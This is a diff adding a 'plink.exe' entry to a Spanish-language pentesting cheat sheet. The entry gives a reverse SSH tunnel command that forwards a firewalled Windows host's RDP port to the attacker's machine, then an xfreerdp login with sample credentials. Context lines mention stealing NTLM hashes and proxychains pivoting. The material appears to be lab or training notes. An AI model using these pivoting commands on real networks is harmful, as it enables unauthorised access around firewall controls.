@@ -406,6 +406,13 @@ Obtener hash NTLM desde un formulario de carga de archivos:
 
   Así, cuando utilicemos proxychains para por ejemplo realizar un escaneo con nmap, utilizará el proxy añadido por el puerto 9998.
 
+plink.exe
+
+  Entramos en un servidor Windows en el que el puerto 80 está accesible, pero el 3389 (rdp) está bloqueado por firewall. Podemos utilizar el binario plink.exe para enviarnos el puerto 3389 a nuestro local (puerto 9833) y poder acceder a él:
+
+    C:\Windows\Temp\plink.exe -ssh -l loqax -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
+
+    xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
 
 ## Vulnerabilidades conocidas
 
